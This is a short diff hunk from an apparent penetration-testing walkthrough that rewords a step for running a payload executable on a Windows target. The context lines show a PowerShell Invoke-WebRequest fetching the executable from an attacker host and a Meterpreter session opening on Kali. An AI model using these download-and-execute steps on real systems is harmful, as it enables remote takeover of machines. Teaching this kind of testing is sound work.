@@ -132,7 +132,7 @@ Get-MpPreference
 Invoke-WebRequest -Uri "http://$lhost/$exe_name" -OutFile "$rpath$exe_name"
 ```
 
-11. Run $exe_name in target via  `$rpath$exe_name`
+11. Execute $exe_name in target via  `$rpath$exe_name` or if you stay in work directory `.\$exe_name`
 
 12. If successful, you will see a Meterpreter session opened in the Kali terminal 2 like that.
 ```msfconsole
